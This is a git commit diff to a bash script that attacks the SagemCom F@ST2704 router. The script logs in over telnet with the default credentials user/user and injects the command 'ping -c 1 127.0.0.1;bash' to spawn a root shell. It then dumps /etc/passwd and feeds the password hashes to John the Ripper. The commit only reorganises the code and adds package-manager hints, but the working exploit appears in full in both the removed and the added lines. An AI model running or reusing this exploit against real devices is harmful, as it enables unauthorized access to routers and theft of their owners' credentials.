0306afc1e255de7d4f60210744feea2dee58836d
Mixbo <mixbo@wakowakowako.com>
2014-08-19 22:25:30 -0300

    Added package manager instructions

--- getHashes.sh
+++ getHashes.sh
@@ -3,52 +3,81 @@
 #	https://github.com/Mixbo/FaST2704/
 #	www.wakowakowako.com
 
+function haveProg() {
+    [ -x "$(which $1)" ]
+}
+
 function main()
 {
 	echo "[+] Launching SagemCom F@ST2704 passwd Tool"
-	type expect >/dev/null 2>&1 || { echo >&2 "[-] expect is not installed. Closing program..."; exit 1; }
-	logfile="hashes.log"
-	hashfile="hashes.txt"
+	if haveProg expect; then
+	
+		logfile="hashes.log"
+		hashfile="hashes.txt"
 
-	if [ -z "$1" ]
-	  then
-	    host="192.168.1.1"
-	  else
-	  	host=$1
+		if [ -z "$1" ]
+		  then
+		    host="192.168.1.1"
+		  else
+		  	host=$1
+		fi
+
+		echo "[+] Connecting to host $host"
+
+
+		(expect -c "
+			set timeout 20
+			spawn telnet $host
+			expect \"Login:\"
+			send \"user\r\"
+			expect \"Password:\"
+			send \"user\r\"
+			expect \">\"
+			send \"ping -c 1 127.0.0.1;bash\n\"
+			expect \"#\"
+			send \"cat /etc/passwd\n\"
+			expect \"#\"
+			exit
+		") > $logfile
+		echo "[+] Saved session in $logfile"
+
+		parse
+
+		
+		if haveProg john; then
+			read -p "[+] Do you want to feed the hashes to John the Ripper? [y/*] " choice
+			case $choice in
+				[Yy]* )
+					echo -e "[+] Starting John the Ripper to crack $hashfile\n\n"
+					sudo john $hashfile
+					echo -e "\n\n"
+					sudo john $hashfile --show
+
+			esac
+		else
+			echo "[-] John the Ripper is not installed."
+			install john
+		fi
+	else
+		echo "[-] expect is not installed.";
+		install expect
+	fi
+}
+
+function install()
+{
+	if haveProg apt-get ; then 
+		echo "[+] You can install it with:	sudo apt-get install $1"
+	elif haveProg yum ; then 
+		echo "[+] You can install it with:	sudo yum install $1"
+	elif haveProg port ; then 
+		echo "[+] You can install it with:	sudo port install $1"
+	elif haveProg pacman ; then 
+		echo "[+] You can install it with:	sudo pacman -S $1"
 	fi
 
-	echo "[+] Connecting to host $host"
-
-
-	(expect -c "
-		set timeout 20
-		spawn telnet $host
-		expect \"Login:\"
-		send \"user\r\"
-		expect \"Password:\"
-		send \"user\r\"
-		expect \">\"
-		send \"ping -c 1 127.0.0.1;bash\n\"
-		expect \"#\"
-		send \"cat /etc/passwd\n\"
-		expect \"#\"
-		exit
-	") > $logfile
-	echo "[+] Saved session in $logfile"
-
-	parse
-
-	type sudo john >/dev/null 2>&1 || { echo >&2 "[-] John the Ripper is not installed. Closing program..."; exit 1; }
-
-	read -p "[+] Do you want to feed the hashes to John the Ripper? [y/*] " choice
-	case $choice in
-		[Yy]* )
-			echo -e "[+] Starting John the Ripper to crack $hashfile\n\n"
-			sudo john $hashfile
-			echo -e "\n\n"
-			sudo john $hashfile --show
-
-	esac
+	echo "[+] Closing..."
+	exit
 }
 
 function parse()
